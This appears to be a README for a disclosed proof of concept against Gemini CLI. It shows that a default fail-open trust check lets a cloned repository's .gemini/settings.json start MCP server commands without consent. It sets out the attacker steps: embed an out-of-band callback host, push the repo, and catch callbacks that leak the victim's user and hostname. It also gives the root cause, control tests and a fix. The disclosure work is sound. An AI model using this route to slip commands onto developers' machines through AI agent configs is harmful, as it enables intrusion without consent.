# GCLI-014 — PoC: MCP Server Spawns Without User Consent

**Vulnerability**: `isTrustedFolder()` returns `true` when `folderTrust=false` (default), causing Gate 1 (`startConfiguredMcpServers`) and Gate 2 (`getConfirmationDetails`) to fail open simultaneously.

**Impact**: Any `.gemini/settings.json` in a cloned repository spawns its configured MCP `command` as an OS subprocess the moment the victim runs `gemini` — no `--yolo`, no dialogs, no consent.

**Affected versions**: Gemini CLI v0.27.0 – v0.35.0+ (default configuration, `folderTrust` not explicitly enabled)

**CVSS 3.1**: 7.3 (High) — AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N

---

## Quick start

### Prerequisites (attacker machine only)

```bash
# interactsh-client
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# python3 — system binary, no install needed on victim
python3 --version
```

### Attacker: Step 1 — Bake the OOB callback URL into settings.json

```bash
chmod +x setup.sh check_callbacks.sh
./setup.sh
```

`setup.sh`:
1. Registers with interactsh → gets a unique OOB host (e.g. `abc123def.oast.live`)
2. Embeds that host **directly** into `.gemini/settings.json`
3. Prints what to do next

```bash
# Commit the configured settings.json and push
git add .gemini/settings.json && git commit -m "add project config" && git push
```

### Attacker: Step 2 — Watch for callbacks

```bash
./check_callbacks.sh
```

Polls `/tmp/gcli014_interactions.json` every 3 seconds and prints formatted output when a DNS or HTTP hit arrives.

### Victim: Step 3 — Standard developer workflow (nothing special)

```bash
git clone https://github.com/attacker/repo && cd repo
gemini -p "What does this project do?"
```

Expected on attacker's `check_callbacks.sh` within 2 seconds:

```
╔══════════════════════════════════════════════════════════════╗
║  [HIT] GCLI-014 callback received!                          ║
╚══════════════════════════════════════════════════════════════╝
  Protocol  : http
  Remote IP : <victim_public_ip>
  Timestamp : 2026-03-25T...
  HTTP Request (first 5 lines):
  GET /gcli014/spawn/uid1000_alice@alices-laptop HTTP/1.1
  Host: abc123def.oast.live
  ...
```

---

## How it works (root cause)

```javascript
// packages/core/src/config/config.js (v0.35.0, line 1676)
isTrustedFolder() {
    // ...
    return this.folderTrust ? (this.trustedFolder ?? false) : true;
    //                                                         ^^^^
    // folderTrust defaults to false → always returns true
    // "trusted" = spawns MCP servers + skips all confirmation dialogs
}
```

`folderTrust` defaults to `false` (line 380: `this.folderTrust = params.folderTrust ?? false`).

When `folderTrust=false`, `isTrustedFolder()` returns `true`. This makes both gates fail open:

| Gate | Location | Guard | Outcome in default config |
|------|----------|-------|--------------------------|
| Gate 1 | `mcp-client-manager.js:369` | `if (!isTrustedFolder()) return;` | `!true` → does NOT return → **server spawns** |
| Gate 2 | `mcp-tool.js:114` | `if (isTrustedFolder() && this.trust) return false;` | `true && true` → **skips confirmation** |

---

## Checking interactsh callbacks manually

If `check_callbacks.sh` is not working, you can inspect interactions directly:

```bash
# Show all interactions received so far
cat /tmp/gcli014_interactions.json

# Filter for HTTP hits only
cat /tmp/gcli014_interactions.json | python3 -c "
import sys, json, base64
for line in sys.stdin:
    line = line.strip()
    if not line: continue
    d = json.loads(line)
    if d.get('protocol') == 'http':
        print('PROTOCOL :', d['protocol'])
        print('REMOTE   :', d.get('remote-address'))
        print('TIME     :', d.get('timestamp'))
        raw = d.get('raw-request', '')
        if raw:
            decoded = base64.b64decode(raw).decode('utf-8', errors='replace')
            print('REQUEST  :')
            for l in decoded.split('\n')[:8]:
                print('  ', l)
        print()
"

# Show the OOB host that was registered
cat .gemini/payload_store.txt

# Check if interactsh listener is still running
kill -0 \$(cat /tmp/gcli014_interactsh.pid 2>/dev/null) 2>/dev/null && echo "running" || echo "stopped"
```

---

## Verifying Gate 1 alone (without trust:true)

To prove server spawn happens even without `"trust": true`:

```bash
# Edit .gemini/settings.json — remove the "trust": true line
# Then run gemini again
gemini -p "What does this project do?"
# DNS hit will still arrive (Gate 1 spawns the process)
# No HTTP hit (Gate 2 blocked tool calls, but the process already ran)
```

---

## Proving the feature works when enabled (control test)

```bash
# Add to ~/.gemini/settings.json:
# { "security": { "folderTrust": true } }

gemini -p "What does this project do?"
# Expected: NO OOB hit. Build-tools server never spawns.
# This confirms the vuln is in the default, not in the feature itself.
```

---

## Remediation

```javascript
// Option A — change default (recommended)
this.folderTrust = params.folderTrust ?? true;  // was: ?? false

// Option B — invert semantics when feature is disabled
return this.folderTrust ? (this.trustedFolder ?? false) : false;
//                                                         ^^^^^
//                                               was: true
```

---

## Files

| File | Purpose |
|------|---------|
| `.gemini/settings.json` | MCP server config — populated by `setup.sh` with live interactsh host |
| `setup.sh` | Starts interactsh, writes settings.json, prints instructions |
| `check_callbacks.sh` | Polls interaction log, formats and highlights hits |

---

*Security research PoC. Do not use against systems you do not own.*
